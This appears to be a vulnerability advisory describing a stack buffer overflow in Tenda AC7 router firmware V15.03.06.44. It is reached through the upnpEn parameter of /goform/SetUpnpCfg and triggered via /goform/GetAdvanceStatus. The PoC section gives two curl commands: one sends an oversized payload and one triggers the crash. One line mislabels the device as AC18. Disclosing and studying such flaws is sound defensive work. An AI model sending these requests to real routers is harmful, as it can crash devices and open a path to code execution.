## Overview

A stack-based buffer overflow exists in Tenda AC7 firmware at the `POST /goform/SetUpnpCfg` endpoint. The handler reads the `upnpEn` POST parameter into a local variable (`Var`) and stores it to configuration via `SetValue("adv.upnp.en", Var)`. That configuration key is later retrieved with `GetValue("adv.upnp.en", v38")` during `GET /goform/GetAdvanceStatus` and copied into a fixed-size stack buffer. Because `SetValue` and `GetValue` perform no length validation, an attacker-supplied oversized `upnpEn` value can overflow the `v38` stack buffer when read back, potentially causing crashes or enabling memory-corruption exploits (including, in some environments, remote code execution).

## Affected product & version

- Product: Tenda AC7 (firmware published on Tenda support site)
- Affected firmware version: **V15.03.06.44**

## Vendor download page

https://www.tenda.com.cn/product/download/AC7.html

## Technical details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/SetUpnpCfg` url. The `Var` variable receives the `upnpEn` parameter from a POST request and is stored in the configuration item named`adv.upnp.en` through the SetValue function.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250928_122719.png)

`adv.upnp.en`  configuration item can  be retrieved through the GetValue function in the `/goform/GetAdvanceStatus` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows by the `upnp` variable.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20251012_101204.png)

## PoC

1. Send a POST to `/goform/SetUpnpCfg` with a malicious `upnpEn` payload.

```bash
curl -s -X POST \
  http://192.168.0.1/goform/SetUpnpCfg \
  -d 'upnpEn=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

2. Trigger Stack Overflow Vulnerability through the `/goform/GetAdvanceStatus` interface.

```bash
curl -s -X POST \
  http://192.168.0.1/goform/GetAdvanceStatus
```

3. Successfully triggered attack

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)